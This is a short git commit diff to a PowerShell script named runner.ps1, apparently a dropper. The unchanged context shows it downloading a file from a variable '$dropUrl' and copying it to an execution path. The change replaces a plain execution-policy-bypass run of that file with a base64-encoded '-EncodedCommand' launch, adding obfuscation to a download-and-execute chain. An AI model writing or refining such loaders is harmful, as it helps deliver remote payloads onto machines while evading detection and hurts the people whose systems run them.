5597bbdf65f572d877aa9791fcff111c2159cfcf
flocktrack <radiofrost@proton.me>
2025-08-03 12:13:30 -0400

    Update runner.ps1

--- runner.ps1
+++ runner.ps1
@@ -13,4 +13,10 @@ Invoke-WebRequest -Uri $dropUrl -OutFile $destPath
 
 Copy-Item -Path $destPath -Destination $execPath
 
-powershell.exe -ExecutionPolicy Bypass -File $execPath
+# Prepare base64 command to execute the .ps1 file
+$cmd = "powershell -ExecutionPolicy Bypass -File `"$execPath`""
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
+# Run encoded command
+powershell.exe -EncodedCommand $encodedCommand
